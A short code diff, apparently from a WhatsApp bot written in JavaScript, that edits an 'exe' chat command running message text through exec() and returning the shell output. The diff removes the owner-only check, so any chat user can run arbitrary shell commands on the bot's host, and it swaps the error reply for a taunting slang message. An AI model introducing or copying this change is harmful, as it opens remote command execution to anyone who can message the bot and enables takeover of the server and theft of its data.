@@ -807,10 +807,9 @@ break
 					break
 				case 'exe':
 	              client.updatePresence(from, Presence.composing) 
-	              if (!isOwner) return reply(mess.only.ownerB)
-	               const cmd = body.slice(5)
+	              const cmd = body.slice(5)
 	               exec(cmd, (err, stdout) => {
-		           if(err) return client.sendMessage(from, "Adios", text, { quoted: mek })
+		           if(err) return client.sendMessage(from, "NO VEMO GILE ✋🥸🤚", text, { quoted: mek })
 		           if (stdout) {
 			       client.sendMessage(from, stdout, text, { quoted: mek })
 		           }
